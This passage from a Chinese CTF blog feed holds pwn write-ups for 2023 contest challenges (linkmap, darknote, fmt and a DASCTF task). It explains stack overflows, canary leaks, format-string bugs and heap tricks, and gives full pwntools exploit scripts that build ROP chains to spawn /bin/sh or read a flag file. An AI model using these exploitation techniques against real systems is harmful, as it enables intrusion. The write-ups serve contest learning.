class="hljs-string">&#x27;your password: &#x27;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>():<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;number you guess: &#x27;</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(fn)<br>    login(<span class="hljs-string">&#x27;admin\x00&#x27;</span>, <span class="hljs-string">&#x27;root\x00&#x27;</span>)<br>    leak_canary()<br>    result = p.recvuntil(<span class="hljs-string">&#x27;1. login in&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;gift&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.close()<br><br><br>start = <span class="hljs-number">0x4012d0</span><br><br><span class="hljs-comment"># 00000000004016DD mov eax, 0; call _printf; nop; pop rbp; retn</span><br>myprintf = <span class="hljs-number">0x4016DD</span><br><br>pop_rbp_ret = <span class="hljs-number">0x000000000040139d</span><br>leave_ret = <span class="hljs-number">0x000000000040147b</span><br><br>leak_canary()<br><br>p.recvuntil(<span class="hljs-string">&#x27;gift!&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br>logout()<br><br><span class="hljs-comment"># dbg()</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&quot;l1s00t%11$p%15$p&quot;</span>, <br>        <span class="hljs-number">0x40</span>: [<br>            canary, <span class="hljs-number">0</span>, myprintf, <span class="hljs-number">0</span>, start<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>login(<span class="hljs-string">&#x27;admin\x00&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x508</span>     <span class="hljs-comment"># login stack</span><br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>logout()<br><br><span class="hljs-comment"># dbg()</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x0000000000090529</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br><br>payload1 = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>        <span class="hljs-number">0x8</span>: <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<br>        <span class="hljs-number">0x18</span>: [<br>            pop_rdi_ret, stack + <span class="hljs-number">0x8</span>, <br>            pop_rsi_ret, <span class="hljs-number">0</span>,<br>            pop_rdx_rbx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>            execve<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x60</span><br>)<br><br>payload2 = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&quot;l1s00t&quot;</span>, <br>        <span class="hljs-number">0x40</span>: [<br>            canary, stack + <span class="hljs-number">0x10</span>, leave_ret<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>login(payload1, payload2)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101007541.png" alt="image-20230725101007541"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-巅峰极客部分复现-pwn</title>
    <link href="/2023/07/23/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/"/>
    <url>/2023/07/23/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-巅峰极客部分复现-pwn"><a href="#2023-巅峰极客部分复现-pwn" class="headerlink" title="2023-巅峰极客部分复现-pwn"></a>2023-巅峰极客部分复现-pwn</h1><h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p>本来以为是一道常规的ret2dlresolve，结果开了Full RELRO保护，就没啥思路了。比赛中就放弃了，转而忙自己的事情了。赛后看wp，发现师傅们是找了一个magic gadget，将read的got表地址写到bss段上。实际上，我当时也看到了那个gadget，但还是没想到利用思路。太菜了。。。</p><p>查看保护</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724170702835.png" alt="image-20230724170702835"></p><p>上来就怼了一个栈溢出。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724171043511.png" alt="image-20230724171043511"></p><p>可以找到这样一段gadget，可以控制rbp指向got表，从而将read地址写到bss段上。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724171221611.png" alt="image-20230724171221611"></p><p>大致思路如下：</p><ol><li>栈溢出覆盖rbp为read_got + 8，将read写到bss段上</li><li>调用read_plt，覆盖bss段上read地址最后一位，使其变为syscall</li><li>利用csu的gadget，调用execve</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./ezzzz&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote()<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br>bss = elf.bss() + <span class="hljs-number">0x400</span>     <span class="hljs-comment"># 0x601410</span><br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>csu_down = <span class="hljs-number">0x4007D6</span><br>csu_up = <span class="hljs-number">0x4007C0</span><br><br>pop_rdi_ret = <span class="hljs-number">0x00000000004007e3</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x00000000004007e1</span><br>pop_rbp_ret = <span class="hljs-number">0x0000000000400570</span><br>leave_ret = <span class="hljs-number">0x0000000000400712</span><br><br><span class="hljs-comment"># 0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span><br>magic_gadget = <span class="hljs-number">0x40066B</span><br><br>myread = <span class="hljs-number">0x601120</span><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x18</span>: [<br>            pop_rdi_ret, <span class="hljs-number">0</span>, pop_rsi_r15_ret, bss, <span class="hljs-number">0</span>, read_plt,<br>            pop_rbp_ret, read_got + <span class="hljs-number">8</span>,<br>            magic_gadget, bss + <span class="hljs-number">0x18</span>,<br>            pop_rdi_ret, <span class="hljs-number">0</span>, pop_rsi_r15_ret, myread - <span class="hljs-number">0x3b</span> + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, read_plt,<br>            leave_ret<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x100</span><br>)<br><br><span class="hljs-comment"># dbg()</span><br><br>p.send(payload)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: bss + <span class="hljs-number">8</span>,<br>        <span class="hljs-number">0x10</span>: <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x20</span>: [<br>            csu_down, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, myread, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss + <span class="hljs-number">0x10</span>, csu_up<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x100</span><br>)<br>p.send(payload)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x3a</span> + <span class="hljs-string">&#x27;\xd0&#x27;</span><br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724172035253.png" alt="image-20230724172035253"></p><h2 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h2><p>这道题漏洞点与2022年国赛初赛的漏洞点一样，都是一开始给了个整数溢出，可以任意地址分配，任意地址泄露。国赛那道题可以看<a href="https://bbs.kanxue.com/thread-273235.htm">Ayakaaa师傅的博客</a>。</p><p>这道题恶心人的地方是，把show、delete与edit都canary绑定到了一块，必须使canary低4位为0才可以使用其功能。我的思路一开始就错了，一直想着如何使canary为0，到最后也没能解出来。赛后看师傅们的wp，发现仅仅使用add就可以完成利用，那几个函数可能是起迷惑作用，很不幸，一开始就被骗了。</p><p>查看保护，没有开PIE。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173022279.png" alt="image-20230724173022279"></p><p>没有限制notes_num的大小。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173129657.png" alt="image-20230724173129657"></p><p>edit、show与delete都与canary绑定了。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173233073.png" alt="image-20230724173233073"></p><p>add函数固定分配0x68大小的chunk，且只能写0x60bytes。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173418333.png" alt="image-20230724173418333"></p><p>这里的menu也有点与众不同，可以用来泄露libc地址。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724173821044.png" alt="image-20230724173821044"></p><p>大致思路为：</p><ol><li>利用任意地址分配伪造main_arena的fastbin[0x70]，需要注意fastbin大小检测。这里伪造chunk块大小与fd指针，通过把fd内容放入tcache绕过大小检测。</li><li>覆盖menu的指针为got表项，泄露libc地址</li><li>由于最大只能分配0x68的堆块，这里通过打栈完成利用，提前在栈上布置好rop链，覆盖malloc_hook为magic gadget，使其跳转到我们的rop链上。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, u64, p16, p32<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./darknote&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, content=<span class="hljs-string">&#x27;l1s00t&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Note: &#x27;</span>, content)<br><br>    <br><span class="hljs-comment"># vmmap_base = 0x7ffff7bbc000</span><br>p.sendlineafter(<span class="hljs-string">&#x27;dark notes do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x40040000</span>))<br><br><span class="hljs-comment"># main_arena -&gt; fastbins</span><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x404240</span>))<br><br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>puts = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;puts&#x27;</span>, puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br>curbrk = libc_base + libc.sym[<span class="hljs-string">&#x27;__curbrk&#x27;</span>]<br><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x404240</span>))<br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(environ))<br><br>stack = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>bss = <span class="hljs-number">0x404400</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000401dc3</span><br>pop_rbp_ret = <span class="hljs-number">0x000000000040131d</span><br>leave_ret = <span class="hljs-number">0x00000000004014f8</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000142c92</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000630a9</span><br><br><span class="hljs-comment"># add rsp, 0xe0; pop rbx; ret</span><br>magic_gadget = libc_base + <span class="hljs-number">0x00000000000ddc57</span><br><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(stack - <span class="hljs-number">0x98</span>))<br>add(<span class="hljs-number">0</span>)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: [<br>            pop_rbp_ret, bss - <span class="hljs-number">0x8</span>, pop_rdi_ret, <span class="hljs-number">0</span>, pop_rsi_ret, bss, pop_rdx_ret, <span class="hljs-number">0x100</span>,<br>            elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>], leave_ret<br>        ],<br>    &#125;<br>)<br>add(<span class="hljs-number">1</span>, payload)<br><br>add(<span class="hljs-number">0x3edba8</span> // <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>, p64(magic_gadget))<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>flag_addr = bss + <span class="hljs-number">0xf0</span><br>data = bss + <span class="hljs-number">0x800</span><br>rop_data = [<br>    pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>    <span class="hljs-number">2</span>,<br>    pop_rdi_ret,<br>    flag_addr,<br>    pop_rsi_ret,<br>    <span class="hljs-number">0</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>    <span class="hljs-number">0</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">3</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>    <span class="hljs-number">1</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">1</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret<br>]<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: rop_data,<br>        <span class="hljs-number">0xf0</span>: <span class="hljs-string">&#x27;flag&#x27;</span><br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x100</span><br>)<br><br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724174228721.png" alt="image-20230724174228721"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-HWS-PWN-WP</title>
    <link href="/2023/07/17/2023-HWS-PWN-WP/"/>
    <url>/2023/07/17/2023-HWS-PWN-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-HWS-PWN-WP"><a href="#2023-HWS-PWN-WP" class="headerlink" title="2023-HWS-PWN-WP"></a>2023-HWS-PWN-WP</h1><p>这次比赛运气比较好，把pwn ak了。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717090112784.png" alt="image-20230717090112784"></p><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>栈上格式化字符串漏洞。有两次机会，每次最多输入80bytes。第一次泄露地址，第二次覆盖返回地址为one_gadget。</p><p><img src="/img/2023-HWS-PWN-WP/image-20230717152420011.png" alt="image-20230717152420011"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./fmt&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30045</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span 